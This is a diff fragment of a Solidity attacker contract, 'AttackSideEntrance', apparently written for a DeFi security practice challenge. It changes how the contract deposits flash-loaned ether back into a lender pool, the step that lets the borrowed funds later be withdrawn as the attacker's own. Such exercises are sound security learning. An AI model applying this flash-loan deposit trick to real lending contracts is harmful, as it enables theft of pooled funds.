@@ -25,11 +25,11 @@ contract AttackSideEntrance {
         console.log("msg.value is = " , msg.value);
         console.log("pool balance is = " , address(sideEntranceLenderPool).balance);
 
-        sideEntranceLenderPool.deposit{value: msg.value}();   // REKT :D
-        // (bool success, ) = address(sideEntranceLenderPool).call{value:msg.value}(
-        //     abi.encodeWithSignature("deposit()")
-        // );
-        // require(success == true, "no rekt");
+        // sideEntranceLenderPool.deposit{value: msg.value}();   // REKT :D
+        (bool success, ) = address(sideEntranceLenderPool).call{value:msg.value}(
+            abi.encodeWithSignature("deposit()")
+        );
+        require(success == true, "no rekt");
     }
 
     function withdrawFromPool() public {
